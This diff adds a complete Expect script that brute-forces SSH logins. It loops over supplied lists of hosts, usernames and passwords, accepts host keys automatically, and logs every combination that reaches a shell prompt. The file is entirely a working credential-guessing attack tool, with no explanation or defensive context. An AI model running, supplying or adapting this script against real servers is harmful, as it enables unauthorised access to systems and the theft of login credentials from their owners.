@@ -1,0 +1,65 @@
+#!/usr/bin/expect -f
+
+# nothink.org
+
+log_user 0
+set timeout 5
+
+if {[llength $argv] != 4} {
+	puts stderr "Usage: $argv0 <hostslist> <userlist> <passlist> <logfile>"
+	exit
+}
+
+set hostlist [lindex $argv 0]
+set userlist [lindex $argv 1]
+set passlist [lindex $argv 2]
+set logfile [lindex $argv 3]
+
+set Hosts [open $hostlist r]
+set Users [open $userlist r]
+set Passs [open $passlist r]
+set log [open $logfile a]
+
+set hosts [read $Hosts]
+set users [read $Users]
+set passs [read $Passs]
+
+set prompt "(%|#|\\$|>) $"
+
+foreach host $hosts {
+	foreach username $users {
+		foreach password $passs {
+			spawn ssh $username@$host
+			
+			expect {
+				-re "Are you sure you want to continue connecting (yes/no)?" {
+					send "yes\r"
+				}
+			}
+
+			expect {
+				-re "$username@$host's password: " {
+					send "$password\r"
+				}
+			}
+
+			expect {
+				-re ".*$prompt" {
+					send "exit\r"
+					puts "$host $username/$password"
+					puts $log "$host $username/$password"
+				}
+				-re "Permission denied, please try again." {
+					send "$username\r"
+				}
+			}
+
+			close -i $spawn_id
+		}
+	}
+}
+
+close $Hosts;
+close $Users;
+close $Passs;
+close $log;
